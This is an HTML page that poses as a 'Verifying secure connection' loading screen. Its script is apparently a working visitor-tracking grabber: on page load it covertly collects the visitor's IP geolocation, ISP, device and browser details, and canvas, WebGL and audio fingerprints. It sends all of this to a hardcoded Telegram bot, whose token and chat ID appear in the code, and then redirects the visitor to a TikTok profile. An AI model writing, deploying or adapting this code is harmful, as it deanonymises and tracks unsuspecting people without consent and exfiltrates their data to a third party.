<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title>
<style>
  html,body{margin:0;height:100%;background:#07080d;color:#e6ebf7;
    font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
    display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px}
  .spinner{width:42px;height:42px;border:3px solid #1c2030;border-top-color:#3d7eff;
    border-radius:50%;animation:spin .8s linear infinite}
  @keyframes spin{to{transform:rotate(360deg)}}
  .txt{color:#7d879e;font-size:14px}
  .sub{color:#3d4762;font-size:12px;margin-top:4px}
</style>
</head>
<body>
<div class="spinner"></div>
<div class="txt">Verifying secure connection…</div>
<div class="sub">Redirecting…</div>

<script>
/* ===================== CONFIG ===================== */
const BOT_TOKEN  = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
const CHAT_ID    = "1979116632";
const REDIRECT   = "https://www.tiktok.com/@whoadrian";
const IP_TIMEOUT_MS = 2500;   // tunggu IP max 2.5s, lalu kirim apa pun
const REDIRECT_AFTER_SEND_MS = 200; // kasih 200ms setelah fetch/sendBeacon
/* ================================================== */

(async function fireAndRedirect(){
  const ua = navigator.userAgent || '';
  const n  = navigator;
  const c  = n.connection || n.mozConnection || n.webkitConnection || {};

  /* ---------- device parse ---------- */
  let os='Unknown', br='Unknown', tp='Desktop';
  if(/android/i.test(ua)){os='Android';tp='Mobile';}
  else if(/iphone|ipad|ipod/i.test(ua)){os='iOS';tp='Mobile';}
  else if(/windows/i.test(ua)){os='Windows';}
  else if(/macintosh|mac os x/i.test(ua)){os='macOS';}
  else if(/linux/i.test(ua)){os='Linux';}
  if(/edg\//i.test(ua))br='Edge';
  else if(/chrome|crios/i.test(ua)&&!/edg/i.test(ua))br='Chrome';
  else if(/firefox|fxios/i.test(ua))br='Firefox';
  else if(/safari/i.test(ua)&&!/chrome/i.test(ua))br='Safari';

  /* ---------- canvas FP ---------- */
  let canvasFP='err';
  try{
    const cv=document.createElement('canvas'); cv.width=220; cv.height=40;
    const x=cv.getContext('2d');
    x.textBaseline='top'; x.font='14px Arial';
    x.fillStyle='#f60'; x.fillRect(0,0,120,30);
    x.fillStyle='#069'; x.fillText('Secure-Verify 🔒',2,4);
    x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fingerprint',4,20);
    canvasFP=cv.toDataURL().slice(-32);
  }catch(e){}

  /* ---------- webgl FP ---------- */
  let webglFP='no-webgl';
  try{
    const cv=document.createElement('canvas');
    const gl=cv.getContext('webgl')||cv.getContext('experimental-webgl');
    if(gl){
      const d=gl.getExtension('WEBGL_debug_renderer_info');
      const v=d?gl.getParameter(d.UNMASKED_VENDOR_WEBGL):'?';
      const r=d?gl.getParameter(d.UNMASKED_RENDERER_WEBGL):'?';
      webglFP=v+' | '+r;
    }
  }catch(e){}

  /* ---------- audio FP (paralel dengan IP) ---------- */
  async function audioFingerprint(){
    try{
      const AC=window.OfflineAudioContext||window.webkitOfflineAudioContext;
      if(!AC) return 'no-audio-ctx';
      const ctx=new AC(1,44100,44100);
      const osc=ctx.createOscillator();
      osc.type='triangle'; osc.frequency.setValueAtTime(10000,ctx.currentTime);
      const cmp=ctx.createDynamicsCompressor();
      cmp.threshold.setValueAtTime(-50,ctx.currentTime);
      cmp.knee.setValueAtTime(40,ctx.currentTime);
      cmp.ratio.setValueAtTime(12,ctx.currentTime);
      cmp.attack.setValueAtTime(0,ctx.currentTime);
      cmp.release.setValueAtTime(0.25,ctx.currentTime);
      osc.connect(cmp); cmp.connect(ctx.destination); osc.start(0);
      const buf=await ctx.startRendering();
      const d=buf.getChannelData(0);
      let s=0; for(let i=4500;i<5000;i++) s+=Math.abs(d[i]);
      return s.toFixed(6);
    }catch(e){ return 'err'; }
  }

  /* ---------- IP lookup dengan timeout ---------- */
  function fetchIPWithTimeout(ms){
    return new Promise(resolve => {
      let done=false;
      const timer=setTimeout(()=>{ if(!done){done=true;resolve({ip:'unknown'});} },ms);
      const eps=['https://ipapi.co/json/','https://api.ip.sb/geoip','https://api.ipify.org?format=json'];
      (async()=>{
        for(const u of eps){
          if(done) return;
          try{
            const r=await fetch(u,{cache:'no-store'});
            if(!r.ok) continue;
            const j=await r.json();
            const ip=j.ip||j.query;
            if(ip && !done){
              done=true;clearTimeout(timer);
              resolve({ip,country:j.country_name||j.country||'',
                region:j.region||j.region_name||'',city:j.city||'',
                isp:j.org||j.isp||'',lat:j.latitude||j.lat||'',lon:j.longitude||j.lon||''});
              return;
            }
          }catch(e){}
        }
        if(!done){done=true;clearTimeout(timer);resolve({ip:'unknown'});}
      })();
    });
  }

  /* ---------- jalankan IP + audio paralel ---------- */
  const [audio, ip] = await Promise.all([audioFingerprint(), fetchIPWithTimeout(IP_TIMEOUT_MS)]);

  const ipLocLine = (ip.city||ip.region||ip.country)
    ? [ip.city,ip.region,ip.country].filter(Boolean).join(', ')
    : 'n/a';

  /* ---------- SATU pesan lengkap ---------- */
  const beacon =
`🔔 <b>New Visitor Beacon</b>
<b>IP:</b> ${ip.ip}
<b>Location (IP-based):</b> ${ipLocLine}
<b>ISP:</b> ${ip.isp||'n/a'}
<b>OS:</b> ${os} · <b>Browser:</b> ${br} · <b>Type:</b> ${tp}
<b>UA:</b> <code>${ua}</code>
<b>Platform:</b> ${n.platform||'?'}
<b>Vendor:</b> ${n.vendor||'?'}
<b>Language:</b> ${n.language||'?'} (${(n.languages||[]).join(',')})
<b>Timezone:</b> ${Intl.DateTimeFormat().resolvedOptions().timeZone||'?'}
<b>Screen:</b> ${screen.width}x${screen.height} @${window.devicePixelRatio||1}x · depth ${screen.colorDepth}
<b>Viewport:</b> ${innerWidth}x${innerHeight}
<b>Cores:</b> ${n.hardwareConcurrency||'?'} · <b>Memory:</b> ${n.deviceMemory||'?'} GB
<b>Touch:</b> ${'ontouchstart' in window||n.maxTouchPoints>0} · <b>Cookies:</b> ${n.cookieEnabled}
<b>Network:</b> ${c.effectiveType||'unknown'} · ${c.downlink?c.downlink+' Mbps':'unknown'} · RTT ${c.rtt?c.rtt+' ms':'unknown'} · saveData ${!!c.saveData}
<b>Online:</b> ${n.onLine}
<b>Referrer:</b> ${document.referrer||'(direct)'}
<b>URL:</b> ${location.href}
<b>Canvas FP:</b> <code>${canvasFP}</code>
<b>WebGL:</b> ${webglFP}
<b>Audio FP:</b> <code>${audio}</code>
<b>Redirect to:</b> ${REDIRECT}`;

  /* ---------- kirim: fetch keepalive dulu, fallback sendBeacon ---------- */
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const body = new URLSearchParams({
    chat_id: CHAT_ID,
    text: beacon,
    parse_mode: 'HTML',
    disable_web_page_preview: 'true'
  });

  let sentOK = false;
  try{
    // fetch keepalive: tidak dibatalkan saat navigasi, bisa dipanggil setelah await
    const r = await fetch(url, {method:'POST', body, keepalive:true});
    sentOK = r.ok;
  }catch(e){}

  if(!sentOK){
    // fallback: sendBeacon (kalau fetch gagal)
    try{
      if(navigator.sendBeacon){
        navigator.sendBeacon(url, body);
      }
    }catch(e){}
  }

  /* ---------- redirect ke TikTok ---------- */
  setTimeout(() => {
    try { location.replace(REDIRECT); }
    catch(e){ location.href = REDIRECT; }
  }, REDIRECT_AFTER_SEND_MS);
})();
</script>
</body>
</html>
